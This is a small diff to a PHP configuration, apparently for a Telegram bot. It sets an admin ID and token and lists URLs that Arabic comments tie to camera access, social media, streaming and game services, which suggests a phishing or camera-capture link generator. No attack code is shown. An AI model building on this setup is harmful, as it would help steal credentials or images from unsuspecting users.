@@ -2,7 +2,7 @@
 $admin = 8169507820;
 $token = file_get_contents("token.txt");
 $brokweb = "https://dev-vlp-admin.pantheonsite.io/howt"; #الكاميرا+...
-$brokweb1 = "https://dev-vlp-admin.pantheonsite.io/howt"; #تويتر-تيك توك-سناب-جوجل-مسنجر
+$brokweb1 = "https://dev-vlp-admin.pantheonsite.io/howt"; #تويتر-تيك توك-سناب-جوجل-مسنجرs
 $brokweb3 = "https://dev-vlp-admin.pantheonsite.io/howt"; #ديسك-بال-نتلفكس
 $brokweb5 = "https://dev-vlp-admin.pantheonsite.io/howt"; # ببجي-فري فير
 $brokweb6 = "https://dev-vlp-admin.pantheonsite.io/howt"; # مواقع html
